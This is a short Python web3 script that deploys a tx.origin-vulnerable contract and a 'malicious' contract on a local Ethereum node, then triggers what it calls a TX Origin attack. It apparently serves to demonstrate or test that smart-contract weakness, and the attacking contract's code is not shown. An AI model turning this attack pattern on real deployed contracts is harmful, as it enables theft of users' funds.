from web3 import Web3
import json

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load vulnerable contract ABI and bytecode
with open('TXOriginVulnerableContract.json') as f:
    contract_data = json.load(f)
vulnerable_abi = contract_data['abi']
vulnerable_bytecode = contract_data['bytecode']

# Load malicious contract ABI and bytecode
with open('MaliciousTXOriginContract.json') as f:
    malicious_data = json.load(f)
malicious_abi = malicious_data['abi']
malicious_bytecode = malicious_data['bytecode']

# Deploy contracts
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

vulnerable_contract = deploy_contract(vulnerable_abi, vulnerable_bytecode)
malicious_contract = deploy_contract(malicious_abi, malicious_bytecode)

# Perform TX Origin attack
def perform_tx_origin_attack(vulnerable_contract, malicious_contract):
    # Attacker sets up malicious contract
    tx_hash = malicious_contract.functions.execute(vulnerable_contract.address).transact()
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print("TX Origin attack completed.")

perform_tx_origin_attack(vulnerable_contract, malicious_contract)
